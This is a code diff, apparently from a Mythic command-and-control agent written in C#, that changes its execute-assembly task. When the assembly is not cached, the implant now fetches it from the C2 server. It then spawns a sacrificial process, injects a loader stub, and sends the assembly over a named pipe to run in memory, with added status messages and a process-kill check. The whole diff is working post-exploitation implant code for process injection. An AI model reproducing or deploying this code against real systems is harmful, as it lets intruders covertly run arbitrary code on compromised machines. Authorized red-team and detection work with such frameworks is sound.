@@ -50,6 +50,8 @@ namespace Tasks
             public string PipeName;
             [DataMember(Name = "assembly_name")]
             public string AssemblyName;
+            [DataMember(Name = "assembly_id")]
+            public string AssemblyId;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
             [DataMember(Name = "loader_stub_id")]
@@ -169,7 +171,15 @@ namespace Tasks
 
                 if (!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                 {
-                    throw new ExecuteAssemblyException($"'{parameters.AssemblyName}' is not loaded (have you registered it?");
+                    if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.AssemblyId, out assemblyBytes))
+                    {
+                        resp = CreateTaskResponse($"Failed to fetch {parameters.AssemblyName} from Mythic", true);
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                        return;
+                    } else
+                    {
+                        _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
+                    }
                 }
 
                 if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
@@ -179,7 +189,7 @@ namespace Tasks
 
                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
                 proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Spawning sacrificial process..."));
                 try
                 {
                     if (!proc.Start())
@@ -204,7 +214,7 @@ namespace Tasks
                             }
                         )
                     );
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
                 if (!proc.Inject(exeAsmPic))
                 {
                     throw new ExecuteAssemblyException($"Failed to inject assembly loader into sacrificial process {info.Application}.");
@@ -232,12 +242,12 @@ namespace Tasks
                 client.ConnectionEstablished += Client_ConnectionEstablished;
                 client.MessageReceived += Client_MessageReceived;
                 client.Disconnect += Client_Disconnect;
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Connecting to named pipe..."));
                 if (!client.Connect(10000))
                 {
                     throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.");
                 }
-
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Sending over assembly..."));
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                 foreach (IPCChunkedData chunk in chunks)
                 {
@@ -245,6 +255,7 @@ namespace Tasks
                 }
 
                 _senderEvent.Set();
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Waiting for assembly to finish..."));
                 WaitHandle.WaitAny(new WaitHandle[]
                 {
                     _cancellationToken.Token.WaitHandle
@@ -261,8 +272,9 @@ namespace Tasks
                 resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
             }
 
-            if (proc != null && !proc.HasExited)
+            if (proc != null && proc.PID > 0 && !proc.HasExited)
             {
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Killing process..."));
                 proc.Kill();
                 resp.Artifacts = [Artifact.ProcessKill((int)proc.PID)];
             }
